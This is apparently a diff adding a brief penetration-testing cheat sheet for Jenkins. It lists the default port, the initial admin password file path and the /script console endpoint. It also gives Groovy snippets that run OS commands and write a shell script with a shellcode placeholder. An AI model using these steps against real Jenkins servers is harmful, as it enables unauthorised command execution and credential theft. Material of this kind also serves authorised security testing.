@@ -1,0 +1,28 @@
+JENKINS
+
+
+PortNo: 8080
+java -jar jenkins.war
+
+Sensitive Files:
+/root/.jenkins/secrets/initialAdminPassword
+
+
+target endpoints:
+/script
+
+
+Code execution:
+	execmd.groovy
+println "cmd.exe /c dir".execute().text
+println "uname -a".execute().text
+	writefile.groovy
+new File("/tmp/shell.sh").write("""
+echo "testing..."
+<shellcode>
+""")
+
+
+
+References
+https://jenkins.io/
